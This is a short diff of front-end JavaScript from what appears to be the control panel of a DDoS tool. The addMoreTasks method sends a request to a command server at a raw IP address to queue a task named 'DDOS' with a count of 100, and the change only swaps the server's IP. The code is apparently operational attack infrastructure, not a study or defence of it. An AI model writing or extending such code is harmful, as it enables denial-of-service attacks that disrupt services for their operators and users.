@@ -78,7 +78,7 @@
         this.showMenu = !this.showMenu;
       },
       addMoreTasks() {
-        axios.post(`http://45.55.70.104:8080/Management/QueueTask`, {
+        axios.post(`http://45.55.105.65:8080/Management/QueueTask`, {
           Task: "DDOS",
           Count: 100,
           TaskParameters: {
